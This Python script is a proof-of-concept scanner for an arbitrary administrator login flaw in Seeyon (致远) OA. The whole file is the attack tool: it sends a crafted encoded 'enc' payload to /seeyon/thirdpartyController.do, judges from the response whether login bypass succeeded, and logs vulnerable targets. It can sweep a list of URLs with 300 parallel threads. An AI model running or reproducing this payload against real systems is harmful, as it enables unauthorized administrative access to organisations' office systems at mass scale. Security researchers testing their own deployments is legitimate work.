# app="致远互联-OA"
import requests,argparse,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings() # 解除警告
GREEN = '\033[92m'
RESET = '\033[0m'
proxies = { 
       "http": "http://127.0.0.1:8080", 
       "https": "http://127.0.0.1:8080" 
       }
def banner():
	banner = """

	██████╗██╗  ██╗ ██████╗ ███████╗███████╗███╗   ██╗ ██╗
██╔════╝██║  ██║██╔═══██╗██╔════╝██╔════╝████╗  ██║███║
██║     ███████║██║   ██║███████╗█████╗  ██╔██╗ ██║╚██║
██║     ██╔══██║██║   ██║╚════██║██╔══╝  ██║╚██╗██║ ██║
╚██████╗██║  ██║╚██████╔╝███████║███████╗██║ ╚████║ ██║
 ╚═════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═══╝ ╚═╝
                                     info:致远OA任意管理员登录
	"""
	print(banner)
def poc(target):
	payload_url = "/seeyon/thirdpartyController.do"
	url = target + payload_url
	headers={
		"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
		"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		"Accept-Language":"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
		"Accept-Encoding":"gzip, deflate",
		"Cookie":'loginPageURL="/main.do";',
		"Upgrade-Insecure-Requests":"1",
		"Content-Type":"application/x-www-form-urlencoded",
		"Content-Length":"76"
	}
	data="method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04%2BLjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1"

	try:
		res = requests.get(url=target,verify=False)
		res1 = requests.post(url=url,headers=headers,data=data,verify=False)
		if res.status_code == 200:
			if res1.status_code == 200 and "异常处理页面" not in res1.text:
		
				print(f"{GREEN}[+]该url存在任意用户登录漏洞：{target}{RESET}")
				with open("result.txt","a",encoding="utf-8") as f:
					f.write(target+"\n")
			else:
				print(f"[-]该url不存在任意用户登录漏洞：{target}")
		else:
			print(f"该url连接失败：{target}")
	except:
		print(f"[*]该url出现错误：{target}")

def main():
	banner()
	parser = argparse.ArgumentParser()
	parser.add_argument("-u","--url",dest="url",type=str,help="please write link")
	parser.add_argument("-f","--file",dest="file",type=str,help="please write file\'path")
	args = parser.parse_args()
	if args.url and not args.file:
		poc(args.url)
	elif args.file and not args.url:
		url_list = []
		with open(args.file,"r",encoding="utf-8") as f:
			for i in f.readlines():
				url_list.append(i.strip().replace("\n",""))
		mp = Pool(300)
		mp.map(poc,url_list)
		mp.close()
		mp.join()
	else:
		print(f"\n\tUage:python {sys.argv[0]} -h")


if __name__ == "__main__":
	main()